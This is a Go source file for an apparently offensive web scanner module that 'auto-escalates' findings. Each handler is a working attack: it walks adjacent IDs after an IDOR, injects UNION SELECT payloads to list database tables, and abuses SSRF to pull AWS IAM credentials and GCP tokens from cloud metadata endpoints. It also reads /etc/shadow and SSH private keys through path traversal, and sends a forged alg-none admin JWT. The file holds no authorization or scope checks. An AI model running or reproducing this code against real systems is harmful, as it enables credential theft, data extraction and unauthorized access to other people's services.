// Package delve auto-escalates findings by probing adjacent attack
// surface. Found an IDOR on /user/123? Delve scans /user/1 through /user/500.
// Found SQLi with UNION? Delve dumps table list. Found SSRF to metadata?
// Delve extracts IAM credentials.
package delve

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ── Types ────────────────────────────────────────────────────────────────

// Escalate describes one auto-escalation action.
type Escalate struct {
	FindingType string
	Action      string          // "id_walk", "table_dump", "metadata_extract", "file_crawl"
	Results     []EscalateHit
	Depth       int
}

// EscalateHit is one piece of data extracted during escalation.
type EscalateHit struct {
	Type  string
	Value string
	URL   string
}

// ── Auto-escalator ───────────────────────────────────────────────────────

// Climb takes a finding and automatically escalates based on its type.
func Climb(client *http.Client, findingType, targetURL, param, payload string) *Escalate {
	e := &Escalate{FindingType: findingType}
	up := strings.ToUpper(findingType)

	switch {
	case strings.Contains(up, "IDOR"):
		return escalateIDOR(client, targetURL, param, payload)
	case strings.Contains(up, "SQL"):
		return escalateSQLi(client, targetURL, param, payload)
	case strings.Contains(up, "SSRF"):
		return escalateSSRF(client, targetURL, param, payload)
	case strings.Contains(up, "LFI") || strings.Contains(up, "PATH TRAVERSAL"):
		return escalateLFI(client, targetURL, param)
	case strings.Contains(up, "JWT") && strings.Contains(up, "NONE"):
		return escalateJWT(client, targetURL)
	}

	return e
}

// ── IDOR: walk adjacent IDs ──────────────────────────────────────────────

func escalateIDOR(client *http.Client, rawURL, param, idStr string) *Escalate {
	e := &Escalate{FindingType: "IDOR", Action: "id_walk"}
	baseID, err := strconv.Atoi(idStr)
	if err != nil {
		return e
	}

	type result struct {
		id     int
		status int
		length int
		body   string
	}

	var wg sync.WaitGroup
	sem := make(chan struct{}, 10)
	ch := make(chan result, 100)

	// Walk 100 IDs in both directions
	for offset := -50; offset <= 50; offset++ {
		targetID := baseID + offset
		if targetID <= 0 {
			continue
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(id int) {
			defer wg.Done()
			defer func() { <-sem }()
			u, _ := setParam(rawURL, param, strconv.Itoa(id))
			req, _ := http.NewRequest("GET", u, nil)
			req.Header.Set("User-Agent", "sxsc-delve/1.0")
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
			ch <- result{id: id, status: resp.StatusCode, length: len(body), body: string(body)}
		}(targetID)
	}
	wg.Wait()
	close(ch)

	// Collect results
	var hits []EscalateHit
	for r := range ch {
		if r.status >= 200 && r.status < 400 && r.length > 50 {
			label := fmt.Sprintf("id=%d (HTTP %d, %d bytes)", r.id, r.status, r.length)
			hits = append(hits, EscalateHit{Type: "adjacent_id", Value: label, URL: fmt.Sprintf("%s?%s=%d", rawURL, param, r.id)})
			e.Depth++
		}
	}

	e.Results = hits
	return e
}

// ── SQLi: dump table list ────────────────────────────────────────────────

func escalateSQLi(client *http.Client, rawURL, param, payload string) *Escalate {
	e := &Escalate{FindingType: "SQL Injection", Action: "table_dump"}

	dumpPayloads := []string{
		"' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables--",
		"' UNION SELECT NULL,group_concat(table_name),NULL,NULL FROM information_schema.tables--",
		"1 UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
	}

	for _, dp := range dumpPayloads {
		u, _ := setParam(rawURL, param, dp)
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("User-Agent", "sxsc-delve/1.0")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		resp.Body.Close()

		// Extract table names
		names := extractWords(string(body), 2, 30)
		if len(names) > 1 {
			e.Results = append(e.Results, EscalateHit{
				Type: "table_list", Value: fmt.Sprintf("%d tables: %s", len(names), strings.Join(names[:min(10, len(names))], ", ")),
			})
			e.Depth++
			break
		}
	}

	return e
}

// ── SSRF: extract cloud metadata ─────────────────────────────────────────

func escalateSSRF(client *http.Client, rawURL, param, payload string) *Escalate {
	e := &Escalate{FindingType: "SSRF", Action: "metadata_extract"}

	probes := []struct {
		url  string
		desc string
	}{
		{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM role name"},
		{"http://169.254.169.254/latest/meta-data/iam/security-credentials/sxsc-role", "AWS IAM credentials"},
		{"http://169.254.169.254/latest/user-data/", "AWS user-data"},
		{"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP access token"},
		{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure instance metadata"},
	}

	for _, probe := range probes {
		u, _ := setParam(rawURL, param, probe.url)
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("User-Agent", "sxsc-delve/1.0")
		if strings.Contains(probe.url, "google") {
			req.Header.Set("Metadata-Flavor", "Google")
		}
		if strings.Contains(probe.url, "azure") || strings.Contains(probe.url, "169.254.169.254") && strings.Contains(probe.url, "metadata/instance") {
			req.Header.Set("Metadata", "true")
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		resp.Body.Close()

		if resp.StatusCode == 200 && len(body) > 10 {
			preview := strings.TrimSpace(string(body))
			if len(preview) > 200 {
				preview = preview[:200] + "..."
			}
			e.Results = append(e.Results, EscalateHit{
				Type: probe.desc, Value: preview, URL: u,
			})
			e.Depth++
		}
	}

	return e
}

// ── LFI: crawl filesystem ────────────────────────────────────────────────

func escalateLFI(client *http.Client, rawURL, param string) *Escalate {
	e := &Escalate{FindingType: "LFI", Action: "file_crawl"}

	files := []string{
		"/etc/passwd", "/etc/shadow", "/etc/hostname",
		"/proc/self/environ", "/proc/self/cmdline",
		"/var/log/nginx/access.log", "/var/log/apache2/access.log",
		"/home/%s/.ssh/id_rsa", "/root/.ssh/id_rsa",
	}

	for _, f := range files {
		u, _ := setParam(rawURL, param, "../../../.."+f)
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("User-Agent", "sxsc-delve/1.0")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		resp.Body.Close()

		if resp.StatusCode == 200 && len(body) > 20 {
			label := fmt.Sprintf("file: %s (%d bytes)", f, len(body))
			e.Results = append(e.Results, EscalateHit{Type: "file_read", Value: label, URL: u})
			e.Depth++
		}
	}

	return e
}

// ── JWT: forge tokens ────────────────────────────────────────────────────

func escalateJWT(client *http.Client, rawURL string) *Escalate {
	e := &Escalate{FindingType: "JWT None Bypass", Action: "token_forge"}
	req, _ := http.NewRequest("GET", rawURL, nil)
	req.Header.Set("Authorization", "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.")
	resp, err := client.Do(req)
	if err == nil {
		resp.Body.Close()
		if resp.StatusCode == 200 {
			e.Results = append(e.Results, EscalateHit{
				Type: "admin_access", Value: "Successfully accessed as admin with forged token",
			})
			e.Depth++
		}
	}
	return e
}

// ── Helpers ──────────────────────────────────────────────────────────────

func setParam(rawURL, param, value string) (string, error) {
	p, err := url.Parse(rawURL)
	if err != nil {
		return "", err
	}
	q := p.Query()
	q.Set(param, value)
	p.RawQuery = q.Encode()
	return p.String(), nil
}

func extractWords(body string, minLen, maxLen int) []string {
	var words []string
	seen := make(map[string]bool)
	current := strings.Builder{}
	for _, r := range body {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '_' {
			current.WriteRune(r)
		} else {
			if current.Len() >= minLen && current.Len() <= maxLen {
				w := strings.ToLower(current.String())
				if !seen[w] {
					seen[w] = true
					words = append(words, w)
				}
			}
			current.Reset()
		}
	}
	return words
}

// ── Compile guards ────────────────────────────────────────────────────────
var _ = fmt.Sprintf
var _ = sync.Mutex{}
var _ = time.Now
